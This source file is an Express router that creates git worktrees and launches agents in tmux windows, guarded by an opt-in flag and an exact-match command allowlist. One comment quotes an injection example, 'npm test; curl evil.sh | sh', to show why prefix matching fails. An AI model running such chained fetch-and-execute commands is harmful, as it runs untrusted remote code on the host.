/**
 * tmux multi-agent worktrees
 *
 * GET    /api/worktrees        — list agent worktrees + their tmux windows
 * POST   /api/worktrees        — create a git worktree and launch an agent in its own tmux window
 * DELETE /api/worktrees/:slug  — kill the tmux window and remove the worktree
 *
 * ── tmux session naming scheme ───────────────────────────────────────────────
 *   session : "agentboard"            (override with AGENT_BOARD_TMUX_SESSION)
 *   window  : "ab-<slug>"             one window per agent worktree
 *   target  : "agentboard:ab-<slug>"  what tmux commands address
 *   path    : <WORKTREE_ROOT>/<slug>  the worktree checkout the window starts in
 *   branch  : "agent/<slug>"          branch created for the worktree
 *
 * <slug> is derived from the requested name, lowercased and restricted to
 * [a-z0-9-]. One flat session with one window per agent means `tmux attach -t
 * agentboard` then Ctrl-b w gives a human the full picture of every running
 * agent, and `tmux kill-window -t agentboard:ab-<slug>` cleanly stops just one.
 *
 * Disabled by default. Set AGENT_BOARD_ENABLE_TMUX=true to allow this router to
 * spawn processes — same opt-in shape as AGENT_BOARD_ENABLE_DOCKER_CONTROL.
 *
 * ── two independent gates ────────────────────────────────────────────────────
 * AGENT_BOARD_ENABLE_TMUX           creates worktrees and empty tmux windows
 * AGENT_BOARD_TMUX_ALLOWED_COMMANDS exact-match allowlist of runnable commands
 *
 * They are deliberately separate. The dashboard has no per-route authentication,
 * so enabling the feature would otherwise hand arbitrary command execution to
 * anyone who can reach the port. With the allowlist empty (the default) a
 * `command` is refused with 403 and this route cannot execute anything at all.
 */
import express from 'express';
import { join } from 'path';

const SLUG_RE = /^[a-z0-9][a-z0-9-]{0,39}$/;
const DEFAULT_SESSION = 'agentboard';
const WINDOW_PREFIX = 'ab-';
const BRANCH_PREFIX = 'agent/';
const DEFAULT_EXEC_TIMEOUT_MS = 30_000;

/** Clamp an operator-supplied timeout to a sane range, falling back to the default. */
export function resolveExecTimeout(raw, fallback = DEFAULT_EXEC_TIMEOUT_MS) {
  const n = Number(raw);
  if (!Number.isFinite(n) || n <= 0) return fallback;
  return Math.max(1_000, Math.min(Math.floor(n), 600_000));
}

/** Lowercase, collapse to [a-z0-9-], trim dashes, cap at 40 chars. */
export function slugifyWorktreeName(raw) {
  const slug = String(raw || '')
    .toLowerCase()
    .replace(/[^a-z0-9-]+/g, '-') // Simplified regex to avoid ReDoS
    .replace(/^-+|-+$/g, '')
    .slice(0, 40)
    .replace(/-+$/g, '');
  return SLUG_RE.test(slug) ? slug : null;
}

/** Compare filesystem paths tolerating separator and trailing-slash differences. */
export function samePath(a, b) {
  if (!a || !b) return false;
  const norm = (p) => String(p).replace(/\\/g, '/').replace(/\/+$/, '');
  return norm(a) === norm(b);
}

export function windowNameFor(slug) { return `${WINDOW_PREFIX}${slug}`; }
export function tmuxTargetFor(slug, session = DEFAULT_SESSION) { return `${session}:${WINDOW_PREFIX}${slug}`; }
export function branchNameFor(slug) { return `${BRANCH_PREFIX}${slug}`; }

export function createWorktreesRouter({
  execFileAsync,
  WORKSPACE_ROOT,
  WORKTREE_ROOT = null,
  TMUX_ENABLED = false,
  TMUX_SESSION = DEFAULT_SESSION,
  ALLOWED_COMMANDS = [],
  EXEC_TIMEOUT_MS = DEFAULT_EXEC_TIMEOUT_MS,
  eventBus = null,
  logStructured = () => {},
}) {
  const router = express.Router();
  const execTimeoutMs = resolveExecTimeout(EXEC_TIMEOUT_MS);
  // Command execution is fail-closed and separate from the feature flag.
  // AGENT_BOARD_ENABLE_TMUX alone lets callers create an isolated worktree and
  // an empty window; it does NOT let them run anything. Sending a command
  // additionally requires the operator to list it in
  // AGENT_BOARD_TMUX_ALLOWED_COMMANDS. The dashboard has no per-route auth, so
  // this allowlist — not the network boundary — is what bounds what a caller
  // who can reach the port is able to execute.
  const allowedCommands = new Set(
    (Array.isArray(ALLOWED_COMMANDS) ? ALLOWED_COMMANDS : String(ALLOWED_COMMANDS || '').split(','))
      .map(s => String(s).trim()).filter(Boolean)
  );
  const worktreeRoot = WORKTREE_ROOT || (WORKSPACE_ROOT ? join(WORKSPACE_ROOT, '.worktrees') : null);

  const naming = {
    session: TMUX_SESSION,
    windowPattern: `${WINDOW_PREFIX}<slug>`,
    targetPattern: `${TMUX_SESSION}:${WINDOW_PREFIX}<slug>`,
    branchPattern: `${BRANCH_PREFIX}<slug>`,
    worktreeRoot,
  };

  /** Run a command, never throwing — callers branch on `ok`. */
  async function run(cmd, args, opts = {}) {
    try {
      const { stdout, stderr } = await execFileAsync(cmd, args, { timeout: execTimeoutMs, maxBuffer: 1024 * 1024, ...opts });
      return { ok: true, stdout: String(stdout || '').trim(), stderr: String(stderr || '').trim() };
    } catch (err) {
      return { ok: false, error: err.message, stderr: String(err.stderr || '').trim(), code: err.code };
    }
  }

  function tmuxUnavailable(result) {
    const details = `${result.error || ''} ${result.stderr || ''}`;
    return result.code === 'ENOENT' || /not found|is not recognized|no such file/i.test(details);
  }

  /**
   * True when kill-window failed only because the window/session was not there.
   * That is a no-op, not a failure — it means the window is already gone, so
   * cleaning up the leftover checkout is safe.
   */
  function windowAlreadyGone(result) {
    const details = `${result.error || ''} ${result.stderr || ''}`;
    return /can't find (window|session)|no such window|window not found|session not found/i.test(details);
  }

  function guard(res) {
    if (!TMUX_ENABLED) {
      res.status(503).json({
        success: false,
        error: 'tmux worktrees are disabled. Set AGENT_BOARD_ENABLE_TMUX=true to enable.',
        naming,
      });
      return false;
    }
    if (!worktreeRoot) {
      res.status(503).json({
        success: false,
        error: 'No worktree root configured. Set WORKSPACE_ROOT or AGENT_BOARD_WORKTREE_ROOT.',
        naming,
      });
      return false;
    }
    return true;
  }

  /** Ensure the shared tmux session exists (idempotent). */
  async function ensureSession() {
    const has = await run('tmux', ['has-session', '-t', TMUX_SESSION]);
    if (has.ok) return { ok: true, created: false };
    if (tmuxUnavailable(has)) return { ok: false, unavailable: true, error: 'tmux is not installed on the dashboard host' };
    const created = await run('tmux', ['new-session', '-d', '-s', TMUX_SESSION, '-c', worktreeRoot]);
    if (!created.ok) {
      return { ok: false, unavailable: tmuxUnavailable(created), error: created.stderr || created.error };
    }
    return { ok: true, created: true };
  }

  async function listTmuxWindows() {
    const result = await run('tmux', ['list-windows', '-t', TMUX_SESSION, '-F', '#{window_name}\t#{window_index}\t#{pane_current_path}']);
    if (!result.ok) return { available: !tmuxUnavailable(result), windows: [] };
    const windows = result.stdout.split('\n').filter(Boolean).map(line => {
      const [name, index, path] = line.split('\t');
      return { name, index: Number(index), path: path || null };
    }).filter(w => w.name?.startsWith(WINDOW_PREFIX));
    return { available: true, windows };
  }

  async function listGitWorktrees() {
    if (!WORKSPACE_ROOT) return [];
    const result = await run('git', ['worktree', 'list', '--porcelain'], { cwd: WORKSPACE_ROOT });
    if (!result.ok) return [];
    const entries = [];
    let current = {};
    for (const line of result.stdout.split('\n')) {
      if (line.startsWith('worktree ')) {
        if (current.path) entries.push(current);
        current = { path: line.slice('worktree '.length) };
      } else if (line.startsWith('branch ')) {
        current.branch = line.slice('branch '.length).replace('refs/heads/', '');
      } else if (line === 'detached') {
        current.branch = null;
      }
    }
    if (current.path) entries.push(current);
    return entries;
  }

  router.get('/worktrees', async (req, res) => {
    if (!TMUX_ENABLED) {
      return res.json({ success: true, enabled: false, worktrees: [], naming, tmuxAvailable: false, commandExecutionEnabled: false, allowedCommands: [] });
    }
    // Enabled but unconfigured: return the route's own 503 rather than letting
    // join(null, slug) throw a TypeError and surface as an Express 500.
    if (!worktreeRoot) {
      return res.status(503).json({
        success: false,
        error: 'No worktree root configured. Set WORKSPACE_ROOT or AGENT_BOARD_WORKTREE_ROOT.',
        naming,
      });
    }
    const { available, windows } = await listTmuxWindows();
    const gitWorktrees = await listGitWorktrees();
    const worktrees = windows.map(w => {
      const slug = w.name.slice(WINDOW_PREFIX.length);
      // Match on the checkout path, not the conventional branch name: a worktree
      // created with a custom `branch` would otherwise be reported as
      // agent/<slug> with hasGitWorktree:false.
      const entry = gitWorktrees.find(g => samePath(g.path, join(worktreeRoot, slug)))
        || (w.path ? gitWorktrees.find(g => samePath(g.path, w.path)) : null);
      return {
        slug,
        window: w.name,
        windowIndex: w.index,
        target: tmuxTargetFor(slug, TMUX_SESSION),
        path: w.path,
        branch: entry?.branch ?? branchNameFor(slug),
        attachCommand: `tmux attach -t ${TMUX_SESSION} \\; select-window -t ${w.name}`,
        hasGitWorktree: !!entry,
      };
    });
    res.json({
      success: true, enabled: true, tmuxAvailable: available, worktrees,
      count: worktrees.length, gitWorktrees, naming,
      commandExecutionEnabled: allowedCommands.size > 0,
      allowedCommands: [...allowedCommands],
    });
  });

  router.post('/worktrees', async (req, res) => {
    if (!guard(res)) return;

    const { name, command = null, branch: requestedBranch = null } = req.body || {};
    const slug = slugifyWorktreeName(name);
    if (!slug) {
      return res.status(400).json({
        success: false,
        error: 'A "name" is required and must reduce to a slug matching [a-z0-9][a-z0-9-]{0,39}',
      });
    }
    if (requestedBranch !== null && (typeof requestedBranch !== 'string' || !/^[A-Za-z0-9._/-]{1,100}$/.test(requestedBranch))) {
      return res.status(400).json({ success: false, error: 'Invalid branch name' });
    }
    if (command !== null && (typeof command !== 'string' || command.length > 2000)) {
      return res.status(400).json({ success: false, error: 'command must be a string under 2000 chars' });
    }
    // Exact match only. Prefix matching would be trivially bypassable —
    // allowing "npm test" would also admit "npm test; curl evil.sh | sh",
    // since tmux runs the string in a shell.
    if (command !== null) {
      if (allowedCommands.size === 0) {
        return res.status(403).json({
          success: false,
          error: 'Command execution is disabled. Set AGENT_BOARD_TMUX_ALLOWED_COMMANDS to an explicit list of permitted commands to enable it. The worktree and window can still be created without a command.',
        });
      }
      if (!allowedCommands.has(command)) {
        logStructured('warn', 'worktree_command_rejected', { slug, command });
        return res.status(403).json({
          success: false,
          error: 'command is not in AGENT_BOARD_TMUX_ALLOWED_COMMANDS (exact match required)',
          allowedCommands: [...allowedCommands],
        });
      }
    }

    const branch = requestedBranch || branchNameFor(slug);
    const windowName = windowNameFor(slug);
    const target = tmuxTargetFor(slug, TMUX_SESSION);
    const worktreePath = join(worktreeRoot, slug);

    const session = await ensureSession();
    if (!session.ok) {
      return res.status(503).json({ success: false, error: session.error, tmuxAvailable: !session.unavailable, naming });
    }

    // Reject duplicates rather than silently attaching to an existing agent window.
    const { windows } = await listTmuxWindows();
    if (windows.some(w => w.name === windowName)) {
      return res.status(409).json({ success: false, error: `Worktree "${slug}" already has a tmux window (${target})`, target });
    }

    // Isolation is the entire point of this feature. Without a dedicated
    // checkout the agent would run in the shared root alongside every other
    // agent, so a worktree failure must abort the launch rather than degrade
    // into the shared tree.
    if (!WORKSPACE_ROOT) {
      return res.status(503).json({
        success: false,
        error: 'WORKSPACE_ROOT is not configured, so an isolated git worktree cannot be created. Refusing to launch an agent in the shared root.',
        naming,
      });
    }

    // Create the git worktree. If the branch already exists, check it out instead of -b.
    let add = await run('git', ['worktree', 'add', '-b', branch, worktreePath], { cwd: WORKSPACE_ROOT });
    if (!add.ok && /already exists|already used by worktree/i.test(`${add.stderr} ${add.error}`)) {
      add = await run('git', ['worktree', 'add', worktreePath, branch], { cwd: WORKSPACE_ROOT });
    }
    if (!add.ok) {
      const detail = add.stderr || add.error;
      logStructured('warn', 'worktree_git_add_failed', { slug, branch, error: detail });
      return res.status(503).json({
        success: false,
        error: `git worktree add failed, refusing to launch without an isolated checkout: ${detail}`,
        naming,
      });
    }

    const startDir = worktreePath;
    const removeWorktree = () => run('git', ['worktree', 'remove', '--force', worktreePath], { cwd: WORKSPACE_ROOT });

    const created = await run('tmux', ['new-window', '-d', '-t', TMUX_SESSION, '-n', windowName, '-c', startDir]);
    if (!created.ok) {
      // Roll the worktree back so a failed launch does not leave orphaned checkouts.
      const removal = await removeWorktree();
      return res.status(503).json({
        success: false,
        error: `Failed to create tmux window: ${created.stderr || created.error}`,
        tmuxAvailable: !tmuxUnavailable(created),
        rolledBack: removal.ok,
        ...(removal.ok
          ? {}
          : { warning: `Could not remove the worktree at ${worktreePath}: ${removal.stderr || removal.error}; left in place for manual cleanup.` }),
        naming,
      });
    }

    // send-keys passes `command` as a single argv element to tmux (execFile, no
    // shell on our side), but tmux itself runs it in the window's shell.
    // A launch that was asked to run a command but could not deliver it is a
    // failed launch: tear the window and worktree back down rather than
    // reporting success over an idle shell.
    if (command) {
      const sent = await run('tmux', ['send-keys', '-t', target, command, 'Enter']);
      if (!sent.ok) {
        // Roll back, but only remove the checkout once the window is gone —
        // otherwise we would delete the directory out from under a live window.
        // This worktree was created moments ago and holds no user work, so the
        // risk here is small, but the ordering rule is the same as on DELETE.
        const killed = await run('tmux', ['kill-window', '-t', target]);
        const windowGone = killed.ok || windowAlreadyGone(killed);
        const removal = windowGone ? await removeWorktree() : null;
        const rolledBack = windowGone && !!removal?.ok;
        return res.status(503).json({
          success: false,
          error: `Failed to deliver command to ${target}: ${sent.stderr || sent.error}`,
          rolledBack,
          ...(windowGone
            ? removal?.ok
              ? {}
              : {
                  warning: `Killed ${target}, but could not remove the worktree at ${worktreePath}: ${removal?.stderr || removal?.error}; left in place for manual cleanup.`,
                }
            : { warning: `Could not kill ${target}; the worktree at ${worktreePath} was left in place for manual cleanup.` }),
          naming,
        });
      }
    }

    logStructured('info', 'worktree_created', { slug, target, branch, path: startDir, hasCommand: !!command });
    eventBus?.emit('worktree_created', {
      metadata: { slug, target, branch, path: startDir, session: TMUX_SESSION, worktreeCreated: true },
    });

    res.status(201).json({
      success: true,
      worktree: {
        slug,
        session: TMUX_SESSION,
        window: windowName,
        target,
        branch,
        path: startDir,
        worktreeCreated: true,
        commandSent: !!command,
        attachCommand: `tmux attach -t ${TMUX_SESSION} \\; select-window -t ${windowName}`,
      },
      naming,
    });
  });

  router.delete('/worktrees/:slug', async (req, res) => {
    if (!guard(res)) return;

    const slug = slugifyWorktreeName(req.params.slug);
    if (!slug) return res.status(400).json({ success: false, error: 'Invalid worktree slug' });

    const target = tmuxTargetFor(slug, TMUX_SESSION);
    const worktreePath = join(worktreeRoot, slug);
    const removeWorktree = req.query.keepWorktree !== 'true';

    const killed = await run('tmux', ['kill-window', '-t', target]);
    if (!killed.ok && tmuxUnavailable(killed)) {
      return res.status(503).json({ success: false, error: 'tmux is not installed on the dashboard host', naming });
    }

    // `git worktree remove --force` discards uncommitted changes. Only do that
    // once we know the window is actually gone. A window that never existed is
    // fine — that is orphan cleanup — but a kill that failed for a real reason
    // (busy window, locked session, permissions) means an agent may still be
    // working in that checkout, so refuse rather than delete its work and
    // report success anyway.
    if (!killed.ok && !windowAlreadyGone(killed)) {
      const detail = killed.stderr || killed.error;
      logStructured('warn', 'worktree_remove_blocked', { slug, target, error: detail });
      return res.status(409).json({
        success: false,
        slug,
        target,
        windowKilled: false,
        worktreeRemoved: false,
        error: `Refusing to remove the worktree: could not kill ${target} (${detail}). An agent may still be working in that checkout, and removal would discard uncommitted changes. Kill the window manually, then retry.`,
      });
    }

    let worktreeRemoved = false;
    let removeError = null;
    if (removeWorktree && WORKSPACE_ROOT) {
      const removed = await run('git', ['worktree', 'remove', '--force', worktreePath], { cwd: WORKSPACE_ROOT });
      worktreeRemoved = removed.ok;
      if (!removed.ok) removeError = removed.stderr || removed.error;
    }

    logStructured('info', 'worktree_removed', { slug, target, windowKilled: killed.ok, worktreeRemoved });
    eventBus?.emit('worktree_removed', { metadata: { slug, target, windowKilled: killed.ok, worktreeRemoved } });

    // Asked to remove the checkout but git refused: report it rather than
    // claiming success over a worktree that is still on disk.
    if (removeWorktree && WORKSPACE_ROOT && !worktreeRemoved) {
      return res.status(500).json({
        success: false, slug, target,
        windowKilled: killed.ok, worktreeRemoved: false,
        error: `tmux window handled, but removing the worktree failed: ${removeError}`,
      });
    }

    res.json({ success: true, slug, target, windowKilled: killed.ok, worktreeRemoved });
  });

  return router;
}
